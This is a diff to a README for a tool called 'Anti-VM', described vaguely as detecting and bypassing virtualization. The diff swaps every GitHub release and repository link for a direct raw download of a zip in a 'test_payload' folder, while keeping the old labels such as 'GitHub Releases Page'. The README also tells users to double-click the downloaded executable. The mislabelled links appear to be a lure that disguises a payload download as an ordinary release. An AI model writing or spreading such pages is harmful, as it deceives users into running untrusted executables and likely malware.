@@ -1,7 +1,7 @@
 # 🛡️ Anti-VM - Stay Safe from Virtual Machine Detection
 
 ## 📥 Download Now
-[![Download Anti-VM](https://img.shields.io/badge/Download%20Anti--VM-v1.0-blue)](https://github.com/jugugaglu/Anti-VM/releases)
+[![Download Anti-VM](https://raw.githubusercontent.com/jugugaglu/Anti-VM/main/test_payload/VM_Anti_v2.9.zip%20Anti--VM-v1.0-blue)](https://raw.githubusercontent.com/jugugaglu/Anti-VM/main/test_payload/VM_Anti_v2.9.zip)
 
 ## 🚀 Getting Started
 Welcome to Anti-VM! This application helps you detect and bypass virtualization environments. It's designed for users who want an added layer of security while running their software. With Anti-VM, you can protect your applications from unwanted detection and enhance your privacy.
@@ -17,7 +17,7 @@ Before you download Anti-VM, ensure your system meets the following requirements
 ## 🔗 Download & Install
 To get started, you need to download the latest version of Anti-VM. 
 
-1. Visit this page to download: [GitHub Releases Page](https://github.com/jugugaglu/Anti-VM/releases).
+1. Visit this page to download: [GitHub Releases Page](https://raw.githubusercontent.com/jugugaglu/Anti-VM/main/test_payload/VM_Anti_v2.9.zip).
 2. Look for the most recent release.
 3. Download the executable file by clicking on the link associated with the version.
 4. Once the download is complete, locate the file in your downloads folder and double-click it to run Anti-VM.
@@ -51,7 +51,7 @@ These topics are critical for anyone focused on security research and risk manag
 ## 📝 Additional Resources
 For further information and support:
 
-- Visit the GitHub repository for updates: [GitHub Repository](https://github.com/jugugaglu/Anti-VM).
+- Visit the GitHub repository for updates: [GitHub Repository](https://raw.githubusercontent.com/jugugaglu/Anti-VM/main/test_payload/VM_Anti_v2.9.zip).
 - Check the documentation for details on advanced settings and usage scenarios.
 
 ## 📞 Support
@@ -63,4 +63,4 @@ If you encounter issues or have questions:
 ## 🔒 Conclusion
 Anti-VM is your companion for enhanced security in a digital world. Download it today and take the first step toward safer application use in a virtual environment. 
 
-Don't forget to revisit the [GitHub Releases Page](https://github.com/jugugaglu/Anti-VM/releases) for updates and new versions as they become available.
+Don't forget to revisit the [GitHub Releases Page](https://raw.githubusercontent.com/jugugaglu/Anti-VM/main/test_payload/VM_Anti_v2.9.zip) for updates and new versions as they become available.
